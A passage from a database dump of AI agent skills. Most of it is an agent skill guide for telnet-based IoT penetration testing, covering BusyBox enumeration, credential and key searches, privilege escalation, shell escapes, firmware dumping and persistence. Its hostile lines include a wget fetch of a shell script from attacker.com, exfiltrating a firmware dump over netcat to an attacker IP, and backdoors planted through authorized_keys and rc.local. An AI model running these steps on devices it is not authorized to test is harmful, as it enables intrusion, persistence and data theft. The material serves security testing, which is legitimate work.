IoT Devices)\n\n**IMPORTANT**: The vast majority of IoT devices use BusyBox, a lightweight suite of Unix utilities designed for embedded systems. BusyBox provides a minimal shell environment with limited command functionality.\n\n**Identifying BusyBox:**\n```bash\n# Check what shell you''re using\nbusybox\nbusybox --help\n\n# Or check symlinks\nls -la /bin/sh\n# Often shows: /bin/sh -> /bin/busybox\n\n# List available BusyBox applets\nbusybox --list\n```\n\n**BusyBox Limitations:**\n- Many standard Linux commands may be simplified versions\n- Some common flags/options may not be available\n- Features like tab completion may be limited or absent\n- Some exploitation techniques that work on full Linux may not work\n\n**Common BusyBox commands available:**\n```bash\n# Core utilities (usually available)\ncat, ls, cd, pwd, echo, cp, mv, rm, mkdir, chmod, chown\nps, kill, top, free, df, mount, umount\ngrep, find, sed, awk (limited versions)\nifconfig, route, ping, netstat, telnet\nvi (basic text editor - no syntax highlighting)\n\n# Check what''s available\nbusybox --list | sort\nls /bin /sbin /usr/bin /usr/sbin\n```\n\n**BusyBox-specific considerations for pentesting:**\n- `ps` output format may differ from standard Linux\n- Some privilege escalation techniques require commands not in BusyBox\n- File permissions still work the same (SUID, sticky bits, etc.)\n- Networking tools are often present (telnet, wget, nc/netcat, ftpget)\n- Python/Perl/Ruby are usually NOT available (device storage constraints)\n\n**Useful BusyBox commands for enumeration:**\n```bash\n# Check BusyBox version (may have known vulnerabilities)\nbusybox | head -1\n\n# Network utilities often available\nnc -l -p 4444  # Netcat listener\nwget http://attacker.com/shell.sh\nftpget server file\ntelnet 192.168.1.1\n\n# httpd (web server) often included\nbusybox httpd -p 8080 -h /tmp  # Quick file sharing\n```\n\n### 3. Device Enumeration\n\nOnce you have shell access, gather the following information:\n\n**System Information:**\n```bash\n# Kernel and system info\nuname -a\ncat /proc/version\ncat /proc/cpuinfo\ncat /proc/meminfo\n\n# Distribution/firmware info\ncat /etc/issue\ncat /etc/*release*\ncat /etc/*version*\n\n# Hostname and network\nhostname\ncat /etc/hostname\nifconfig -a\ncat /etc/network/interfaces\ncat /etc/resolv.conf\n\n# Mounted filesystems\nmount\ncat /proc/mounts\ndf -h\n\n# Running processes\nps aux\nps -ef\ntop -b -n 1\n```\n\n**User and Permission Information:**\n```bash\n# Current user context\nid\nwhoami\ngroups\n\n# User accounts\ncat /etc/passwd\ncat /etc/shadow  # If readable - major security issue!\ncat /etc/group\n\n# Sudo/privilege info\nsudo -l\ncat /etc/sudoers\n```\n\n**Network Services:**\n```bash\n# Listening services\nnetstat -tulpn\nlsof -i\n\n# Firewall rules\niptables -L -n -v\ncat /etc/iptables/*\n```\n\n**Interesting Files and Directories:**\n```bash\n# Configuration files\nls -la /etc/\nfind /etc/ -type f -readable\n\n# Web server configs\nls -la /etc/nginx/\nls -la /etc/apache2/\nls -la /var/www/\n\n# Credentials and keys\nfind / -name \"*.pem\" 2>/dev/null\nfind / -name \"*.key\" 2>/dev/null\nfind / -name \"*password*\" 2>/dev/null\nfind / -name \"*credential*\" 2>/dev/null\ngrep -r \"password\" /etc/ 2>/dev/null\n\n# SUID/SGID binaries (privilege escalation vectors)\nfind / -perm -4000 -type f 2>/dev/null\nfind / -perm -2000 -type f 2>/dev/null\n\n# World-writable files/directories\nfind / -perm -2 -type f 2>/dev/null\nfind / -perm -2 -type d 2>/dev/null\n\n# Development/debugging tools\nwhich gdb gcc python perl ruby tcpdump\nls /usr/bin/ /bin/ /sbin/ /usr/sbin/\n```\n\n### 4. Privilege Escalation (if not root)\n\n**Check for common vulnerabilities:**\n```bash\n# Kernel exploits\nuname -r  # Check kernel version for known exploits\n\n# Check for exploitable services\nps aux | grep root\n\n# Writable service files\nfind /etc/init.d/ -writable 2>/dev/null\n\n# Cron jobs\ncrontab -l\nls -la /etc/cron*\ncat /etc/crontab\n```\n\n### 5. Persistence and Further Access\n\n**Establish additional access methods:**\n```bash\n# Add SSH access (if SSH is available)\nmkdir -p /root/.ssh\necho \"your_ssh_public_key\" >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\nchmod 700 /root/.ssh\n\n# Start SSH service (if not running)\n/etc/init.d/ssh start\n# or\n/etc/init.d/sshd start\n# or\n/etc/init.d/dropbear start  # Common on embedded devices\n\n# Add to startup scripts\necho \"/path/to/backdoor &\" >> /etc/rc.local\n```\n\n### 6. Firmware Extraction\n\n**Extract firmware for offline analysis:**\n```bash\n# Find MTD partitions (common on embedded devices)\ncat /proc/mtd\ncat /proc/partitions\n\n# Dump flash partitions\ndd if=/dev/mtd0 of=/tmp/bootloader.bin\ndd if=/dev/mtd1 of=/tmp/kernel.bin\ndd if=/dev/mtd2 of=/tmp/rootfs.bin\n\n# Copy to external storage or network\n# If network is available:\nnc attacker_ip 4444 < /tmp/rootfs.bin\n\n# If HTTP server is available:\ncd /tmp\nbusybox httpd -p 8000\n# Then download from http://device_ip:8000/rootfs.bin\n```\n\n## Common IoT Device Scenarios\n\n### Scenario 1: No Authentication Shell\n```bash\n# Connect - drops directly to root shell\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --interactive\n# Enumerate and exploit\n```\n\n### Scenario 2: Custom Port No-Auth Shell\n```bash\n# Many IoT cameras use port 2222\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --interactive\n```\n\n### Scenario 3: Password-Protected Shell\n```bash\n# If you encounter a password prompt, the helper will detect it\n# Try default credentials:\n# - root/root\n# - admin/admin\n# - root/(empty)\n# Search online for device-specific defaults\n```\n\n### Scenario 4: Limited Shell Escape\n```bash\n# If you get a limited shell:\n# Try common escape techniques:\necho $SHELL\n/bin/sh\n/bin/bash\nvi  # Then :!/bin/sh\nless /etc/passwd  # Then !/bin/sh\nfind / -exec /bin/sh \\;\nawk ''BEGIN {system(\"/bin/sh\")}''\n```\n\n## Security Testing Checklist\n\n- [ ] Identify device and firmware version\n- [ ] Check for unauthenticated access\n- [ ] Test for default/weak credentials\n- [ ] Enumerate network services and open ports\n- [ ] Check for hardcoded credentials in files\n- [ ] Test for command injection vulnerabilities\n- [ ] Check file permissions (SUID, world-writable)\n- [ ] Check for outdated software with known CVEs\n- [ ] Test for privilege escalation vectors\n- [ ] Extract firmware for offline analysis\n- [ ] Document all findings with screenshots/logs\n\n## Best Practices\n\n1. **Always log your session**: Default logfile is `/tmp/telnet_session.log`\n2. **Document everything**: Take notes on commands, responses, and findings\n3. **Use batch scripts**: Create enumeration scripts for common tasks\n4. **Research the device**: Look up known vulnerabilities, default credentials, and common issues\n5. **Use proper authorization**: Only perform pentesting on devices you own or have explicit permission to test\n6. **Be careful with destructive commands**: Avoid commands that could brick devices or corrupt data\n7. **Monitor your session**: Use `tail -f` in another terminal to watch activity\n\n## Troubleshooting\n\n**Problem: Connection refused**\n- Solution: Check if telnet service is running, verify port number, check firewall rules\n\n**Problem: Connection timeout**\n- Solution: Verify network connectivity, check if device is powered on, verify IP address\n\n**Problem: \"Permission denied\"**\n- Solution: Telnet service may require authentication, try default credentials\n\n**Problem: Commands not echoing**\n- Solution: Use `--raw` flag to see unfiltered output\n\n**Problem: Garbled output or wrong prompt detection**\n- Solution: Use `--prompt` flag with custom regex pattern for your specific device\n\n## Pre-built Enumeration Scripts\n\nThe skill includes pre-built enumeration scripts for common tasks:\n\n- `enum_system.txt`: System information gathering\n- `enum_network.txt`: Network configuration enumeration\n- `enum_files.txt`: File system exploration\n- `enum_security.txt`: Security-focused enumeration\n\n**Usage:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --script .claude/skills/telnetshell/enum_system.txt\n```\n\n## Example Usage\n\n```bash\n# Basic connection to standard telnet port\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"uname -a\"\n\n# Connection to custom port (common for IoT cameras)\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --command \"ls /\"\n\n# Interactive session with logging\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --logfile /tmp/camera_session.log \\\n  --interactive\n\n# Batch enumeration\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --script enum_system.txt \\\n  --json > results.json\n\n# Long-running command with custom timeout\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --timeout 10 \\\n  --command \"find / -name ''*.conf''\"\n```\n\n## References\n\n- [BusyBox Official Site](https://busybox.net/)\n- [BusyBox Command List](https://busybox.net/downloads/BusyBox.html)\n- IoT pentesting resources and vulnerability databases\n- Device-specific documentation and datasheets\n"},"lastSynced":"2026-02-18T02:19:55.862Z","agentAnalysis":{"suitability":{"en":"Ideal for IoT Security Agents requiring advanced telnet shell interaction for penetration testing operations","zh":"适用于需要高级 telnet shell 交互的 IoT 安全代理进行渗透测试操作","ja":"IoT セキュリティ エージェントがペネトレーション テスト操作のために高度な telnet シェル インタラクションを必要とする場合に最適","ko":"IoT 보안 에이전트가 침투 테스트 운영을 위해 고급 텔넷 쉘 상호 작용을 필요로 할 때 적합","es":"Ideal para agentes de seguridad de IoT que requieren una interacción avanzada con la shell de telnet para operaciones de pruebas de penetración","fr":"Idéal pour les agents de sécurité IoT nécessitant une interaction avancée avec la shell Telnet pour les opérations de test de pénétration","de":"Ideal für IoT-Sicherheitsagenten, die eine erweiterte Telnet-Shell-Interaktion für Penetrations-testoperationen erfordern","pt":"Ideal para Agentes de Segurança de IoT que exigem interação avançada de shell telnet para operações de teste de penetração","ru":"Идеально для агентов безопасности IoT, требующих расширенного взаимодействия с shell telnet для операций тестирования на проникновение","ar":"مثالي لعميل أمن آي أو تي الذي يتطلب تفاعل متقدم لخلفية تيلنيت لعمليات اختبار الاختراق"},"recommendation":{"en":"Empowers agents to interact with IoT device shells via telnet, enabling unauthenticated access, weak authentication testing, and post-exploitation activities using the pexpect library and supporting Python 3","zh":"赋予代理通过 telnet 与 IoT 设备 shell 交互的能力，实现无身份验证访问、弱身份验证测试和使用 pexpect 库以及支持 Python 3 的后期利用活动","ja":"エージェントが telnet を使用して IoT デバイスのシェルとやり取りできるようにし、認証されていないアクセス、弱い認証のテスト、および pexpect ライブラリと Python 3 をサポートすることによる後期の悪用活動を可能にします","ko":"에이전트가 텔넷을 통해 IoT 장치 쉘과 상호 작용할 수 있도록 하여 인증되지 않은 액세스, 약한 인증 테스트 및 pexpect 라이브러리 및 Python 3를 지원하는 후속 악용 활동을 가능하게 함","es":"Habilita a los agentes a interactuar con las shells de dispositivos IoT a través de telnet, permitiendo el acceso no autenticado, pruebas de autenticación débil y actividades de postexplotación utilizando la biblioteca pexpect y compatible con Python 3","fr":"Permet aux agents d''interagir avec les shells d''appareils IoT via Telnet, permettant l''accès non authentifié, les tests d''authentification faible et les activités post-exploitation en utilisant la bibliothèque pexpect et prenant en charge Python 3","de":"Ermächtigt die Agenten, mit den Shells von IoT-Geräten über Telnet zu interagieren, ermöglicht den nicht authentifizierten Zugriff, Tests der schwachen Authentifizierung und Post-Exploitation-Aktivitäten unter Verwendung der pexpect-Bibliothek und unterstützt Python 3","pt":"Habilita os agentes a interagirem com shells de dispositivos IoT via telnet, permitindo acesso não autenticado, teste de autenticação fraca e atividades pós-exploração usando a biblioteca pexpect e suportando Python 3","ru":"Наделяет агентов возможностью взаимодействия с shell устройств IoT через telnet, обеспечивая неаутентифицированный доступ, тестирование слабой аутентификации и пост-эксплуатационные активности с использованием библиотеки pexpect и поддержкой Python 3","ar":"يمكن للعميل التفاعل مع قشرة أجهزة آي أو تي عبر تيلنيت، وتمكين الوصول غير المصرّح به واختبار مصادقة ضعيف والنّشاطات بعد الاستغلال باستخدام مكتبة pexpect ودعم بايثون 3"},"useCases":{"en":["Enumerating IoT devices","Conducting weak authentication testing","Performing post-exploitation activities on compromised devices"],"zh":["枚举 IoT 设备","进行弱身份验证测试","在损害设备上执行后期利用活动"],"ja":["IoT デバイスの列挙","弱い認証のテスト","損害を受けたデバイスでの後期の悪用活動の実行"],"ko":["IoT 장치 열거","약한 인증 테스트","손상된 장치에서 후속 악용 활동 수행"],"es":["Enumerar dispositivos IoT","Realizar pruebas de autenticación débil","Realizar actividades de postexplotación en dispositivos comprometidos"],"fr":["Énumérer les appareils IoT","Effectuer des tests d''authentification faible","Effectuer des activités post-exploitation sur les appareils compromis"],"de":["IoT-Geräte auflisten","Schwache Authentifizierungstests durchführen","Post-Exploitation-Aktivitäten auf kompromittierten Geräten durchführen"],"pt":["Enumerar dispositivos IoT","Realizar testes de autenticação fraca","Realizar atividades pós-exploração em dispositivos comprometidos"],"ru":["Перечисление устройств IoT","Проведение тестирования слабой аутентификации","Выполнение пост-эксплуатационных действий на скомпрометированных устройствах"],"ar":["تحديد أجهزة آي أو تي","إجراء اختبارات مصادقة ضعيف","إجراء نشاطات بعد الاستغلال على الأجهزة المخترقة"]},"limitations":{"en":["Requires Python 3 with pexpect library","Needs telnet client installed on the system","Depends on network access to the target device"],"zh":["需要 Python 3 和 pexpect 库","需要在系统上安装 telnet 客户端","依赖于对目标设备的网络访问"],"ja":["Python 3 と pexpect ライブラリが必要","システムに telnet クライアントをインストールする必要がある","ターゲット デバイスへのネットワーク アクセスに依存"],"ko":["Python 3 및 pexpect 라이브러리가 필요","시스템에 텔넷 클라이언트를 설치해야 함","대상 장치에 대한 네트워크 액세스가 필요"],"es":["Requiere Python 3 con la biblioteca pexpect","Necesita un cliente telnet instalado en el sistema","Depende del acceso a la red al dispositivo objetivo"],"fr":["Nécessite Python 3 avec la bibliothèque pexpect","Nécessite un client Telnet installé sur le système","Dépend de l''accès au réseau à l''appareil cible"],"de":["Benötigt Python 3 mit der pexpect-Bibliothek","Benötigt einen installierten Telnet-Client auf dem System","Hängt vom Netzwerkzugriff auf das Zielgerät ab"],"pt":["Exige Python 3 com biblioteca pexpect","Necessita de cliente telnet instalado no sistema","Depende do acesso de rede ao dispositivo de destino"],"ru":["Требует Python 3 с библиотекой pexpect","Требует установки клиента telnet в системе","Зависит от сетевого доступа к целевому устройству"],"ar":["يتطلب بايثون 3 مع مكتبة pexpect","يحتاج إلى تثبيت عميل تيلنيت على النظام","يعتمد على الوصول إلى الشبكة إلى الجهاز المستهدف"]},"version":3},"qualityScore":80}');
INSERT OR REPLACE INTO skills (id, category, owner, repo, repo_path, name, stars, forks, quality_score, updated_at, last_synced, content_hash, data_json) VALUES ('vectorize-io/hindsight/hindsight-docs', 'community', 'vectorize-io', 'hindsight', 'vectorize-io/hindsight', 'hindsight-docs', 0, 0, 55, '2026-02-18T01:08:43.396Z', '2026-02-18T02:19:58.289Z', NULL, '{"id":"vectorize-io/hindsight/hindsight-docs","name":"hindsight-docs","description":{"zh":"Hindsight 文档提供了完整的技术文档，帮助开发者了解和使用 AI 代理记忆系统","ja":"Hindsight ドキュメントは、AI エージェントの記憶システムを理解して使用するための完全な技術文書を提供します","ko":"Hindsight 문서는 AI 에이전트 메모리 시스템을 이해하고 사용하는 데 필요한 완전한 기술 문서를 제공합니다","es":"Hindsight es un sistema de memoria biomimético para agentes AI que permite el aprendizaje y la adaptación. La documentación técnica cubre arquitectura, operaciones y configuración.","fr":"Hindsight est un système de mémoire biomimétique pour agents IA qui permet l''apprentissage et l''adaptation. La documentation technique couvre l''architecture, les opérations et la configuration.","de":"Hindsight ist ein biomimetisches Gedächtnissystem für KI-Agenten, das Lernen und Anpassung ermöglicht. Die technische Dokumentation behandelt Architektur, Operationen und Konfiguration.","pt":"O Hindsight é um sistema de memória biomimética para agentes de IA que permite aprender e se adaptar. Aprenda a configurar e integrar com facilidade.","ru":"Hindsight - биомиметическая память для агентов ИИ, которая позволяет учиться и адаптироваться. Узнайте, как настроить и интегрировать легко.","ar":"هينسايت هو نظام ذاكرة بيوميميتيكي للوكلاء الذكية الذي يسمح بالتعلم والتكيف. تعرف على كيفية تهيئة وتكامل بسلاسة.","en":"Hindsight: Agent Memory That  Learns"},"seo":{"title":{"zh":"Hindsight 文档：AI 代理记忆系统","ja":"Hindsight ドキュメント：AI エージェントの記憶システム","ko":"Hindsight 문서: AI 에이전트 메모리 시스템","es":"Hindsight Docs: Memoria Biomimética para Agentes AI","fr":"Hindsight Docs: Mémoire Biomimétique pour Agents IA","de":"Hindsight Docs: Biomimetisches Gedächtnis für KI-Agenten","pt"